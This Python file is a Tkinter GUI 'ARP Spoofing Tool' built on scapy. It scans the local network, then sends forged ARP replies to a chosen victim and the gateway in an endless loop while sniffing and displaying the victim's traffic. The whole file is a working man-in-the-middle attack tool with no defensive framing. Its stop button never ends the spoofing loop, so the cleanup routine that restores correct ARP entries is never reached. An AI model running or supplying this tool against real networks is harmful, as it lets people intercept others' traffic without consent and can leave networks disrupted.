import os
import socket
import psutil
from scapy.all import ARP, Ether, srp, send, sniff, IP, TCP, UDP, ICMP
import tkinter as tk
from tkinter import ttk
import threading
import subprocess
import platform

class ARP_Spoof_GUI:
    def __init__(self, master):
        self.master = master
        master.title("ARP Spoofing Tool")

        self.frame1 = ttk.Frame(master)
        self.frame1.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)

        self.label_interface = ttk.Label(self.frame1, text="Network Interface:")
        self.label_interface.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.interfaces = ttk.Combobox(self.frame1)
        self.interfaces.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        self.scan_button = ttk.Button(self.frame1, text="Scan Network", command=self.scan_network)
        self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)

        self.frame2 = ttk.Frame(master)
        self.frame2.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)

        self.devices_treeview = ttk.Treeview(self.frame2)
        self.devices_treeview["columns"] = ("IP Address", "MAC Address")
        self.devices_treeview.heading("#0", text="Device")
        self.devices_treeview.heading("IP Address", text="IP Address")
        self.devices_treeview.heading("MAC Address", text="MAC Address")
        self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

        self.frame3 = ttk.Frame(master)
        self.frame3.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)

        self.label_victim_ip = ttk.Label(self.frame3, text="Victim IP Address:")
        self.label_victim_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.entry_victim_ip = ttk.Entry(self.frame3)
        self.entry_victim_ip.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        self.label_gateway_ip = ttk.Label(self.frame3, text="Gateway IP Address:")
        self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)

        self.entry_gateway_ip = ttk.Entry(self.frame3)
        self.entry_gateway_ip.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)

        self.frame4 = ttk.Frame(master)
        self.frame4.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)

        self.attack_button = ttk.Button(self.frame4, text="Start Attack", command=self.start_attack)
        self.attack_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.stop_button = ttk.Button(self.frame4, text="Stop Attack", command=self.stop_attack)
        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.stop_button.configure(state=tk.DISABLED)

        self.packet_text = tk.Text(master, height=10, width=70)
        self.packet_text.grid(row=4, column=0, padx=10, pady=5, sticky=tk.W+tk.E)

        self.scan_thread = None
        self.attack_thread = None
        self.sniff_thread = None

        # Set default network interface
        self.set_network_interfaces()

    def set_network_interfaces(self):
        try:
            interfaces = self.get_network_interfaces()
            if interfaces:
                interfaces_list = list(interfaces)
                self.interfaces['values'] = interfaces_list
                self.interfaces.set(interfaces_list[0])
        except Exception as e:
            print(f"Error setting network interfaces: {e}")

    def get_network_interfaces(self):
        try:
            if platform.system() == 'Windows':
                interfaces = psutil.net_if_addrs().keys()
            else:
                interfaces = [interface.name for interface in psutil.net_if_addrs().values()]
            return interfaces
        except Exception as e:
            print(f"Error getting network interfaces: {e}")
            return None

    def scan_network(self):
        try:
            for item in self.devices_treeview.get_children():
                self.devices_treeview.delete(item)

            selected_network = self.interfaces.get()

            self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
            self.scan_thread.start()
        except Exception as e:
            print(f"Error initiating network scan: {e}")

    def do_scan_network(self, selected_network):
        try:
            ip_range = self.get_ip_range(selected_network)
            if not ip_range:
                self.insert_to_treeview("Unable to get IP range for the selected network interface.")
                return

            self.insert_to_treeview(f"Scanning network: {ip_range}...")
            devices = self.scan_with_scapy(ip_range)

            unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
            devices = list(unique_devices.values())

            for device in devices:
                self.insert_to_treeview(device['ip'], device['mac'])
        except Exception as e:
            print(f"Error scanning network: {e}")

    def get_ip_range(self, interface):
        ip_address = self.get_ip_address(interface)
        netmask = self.get_netmask(interface)
        if ip_address and netmask:
            return self.ip_to_cidr(ip_address, netmask)
        return None

    def get_ip_address(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.address
        return None

    def get_netmask(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.netmask
        return None

    def ip_to_cidr(self, ip, netmask):
        ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
        netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
        cidr = sum([1 for bit in netmask_bits if bit == '1'])
        return f"{ip}/{cidr}"

    def scan_with_scapy(self, ip_range):
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=5, verbose=False)[0]
        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})

        return devices

    def insert_to_treeview(self, ip, mac=None):
        if mac:
            self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
        else:
            self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))

    def start_attack(self):
        self.attack_button.configure(state=tk.DISABLED)
        self.stop_button.configure(state=tk.NORMAL)

        gateway_ip = self.entry_gateway_ip.get()
        victim_ip = self.entry_victim_ip.get()

        self.attack_thread = threading.Thread(target=self.do_start_attack, args=(gateway_ip, victim_ip))
        self.attack_thread.start()

        self.sniff_thread = threading.Thread(target=self.start_sniffing, args=(victim_ip,))
        self.sniff_thread.start()

    def do_start_attack(self, gateway_ip, victim_ip):
        victim_mac = None
        gateway_mac = None

        devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))

        for device in devices:
            if device['ip'] == victim_ip:
                victim_mac = device['mac']
            if device['ip'] == gateway_ip:
                gateway_mac = device['mac']

        if not victim_mac or not gateway_mac:
            self.insert_to_treeview("Could not find MAC addresses for the given IPs.")
            return

        self.insert_to_treeview(f"Starting ARP spoofing: {victim_ip} ({victim_mac}) -> {gateway_ip} ({gateway_mac})")
        try:
            while True:
                self.arp_spoof(victim_ip, victim_mac, gateway_ip)
                self.arp_spoof(gateway_ip, gateway_mac, victim_ip)
        except KeyboardInterrupt:
            self.insert_to_treeview("\nStopping ARP spoofing. Restoring network...")
            self.restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
            self.restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
            self.attack_button.configure(state=tk.NORMAL)
            self.stop_button.configure(state=tk.DISABLED)

    def arp_spoof(self, target_ip, target_mac, spoof_ip):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False)

    def start_sniffing(self, victim_ip):
        sniff(filter=f"host {victim_ip}", prn=self.handle_packet)

    def handle_packet(self, packet):
        self.packet_text.insert(tk.END, f"{packet.summary()}\n")
        self.packet_text.see(tk.END)

    def stop_attack(self):
        self.attack_button.configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk.DISABLED)

        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join()

        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()


def main():
    try:
        root = tk.Tk()
        gui = ARP_Spoof_GUI(root)
        root.mainloop()
    except Exception as e:
        print(f"GUI Error: {e}")

if __name__ == "__main__":
    main()
